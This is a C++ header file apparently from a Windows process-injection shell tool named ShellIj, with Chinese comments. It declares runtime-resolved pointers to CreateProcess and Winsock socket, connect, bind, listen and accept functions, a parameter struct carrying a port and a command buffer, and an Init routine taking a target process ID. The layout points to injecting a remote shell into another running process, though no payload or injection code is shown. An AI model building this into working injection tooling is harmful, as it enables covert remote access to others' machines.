//
// Created by lkw on 2023/10/11.
//

#ifndef SHELLIJ_SHELLIJ_H
#define SHELLIJ_SHELLIJ_H

#include <iostream>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

// 定义各种指针变量
typedef HMODULE(WINAPI* LOADLIBRARY)(LPCTSTR);
typedef FARPROC(WINAPI* GETPROCADDRESS) (HMODULE, LPCSTR);

typedef int (WINAPI* BIND) (SOCKET, const struct sockaddr*, int);
typedef SOCKET(WINAPI* ACCEPT) (SOCKET, struct sockaddr*, int*);
typedef int (WINAPI* LISTEN) (SOCKET, int);
typedef int (WINAPI* WSASTARTUP) (WORD, LPWSADATA);
typedef SOCKET(WINAPI* WSASOCKET) (int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
typedef int (WINAPI* WSACONNECT) (SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);
typedef BOOL(WINAPI* CREATEPROCESS) (LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL,DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);

typedef struct
{
    HANDLE          KernelHandle;
    char            kernelstring[20];        // 存储kernel32.dll字符串
    char            CreateProcessstring[20]; // 存放函数名字字符串
    LOADLIBRARY     KernelLoadLibrary;
    GETPROCADDRESS  KernelGetProcAddress;
    CREATEPROCESS   KernelCreateProcess;

    HANDLE      WSAHandle;
    char        wsastring[20];
    char        wsastartupstring[20];
    char        WSASocketString[20];
    char        WSAConnectstring[20];
    char        bindstring[20];
    char        acceptstring[10];
    char        listenstring[10];

    WSASTARTUP  ShellWsaStartup;
    ACCEPT      ShellAccept;
    BIND        ShellBind;
    WSACONNECT  ShellWsaConnect;
    WSASOCKET   ShellWSASocket;
    LISTEN      ShellListen;

    unsigned short port;
    char cmd[255];
} PARAMETROS;

class ShellIj {
public:
    static void Init(int PID);
};


#endif //SHELLIJ_SHELLIJ_H
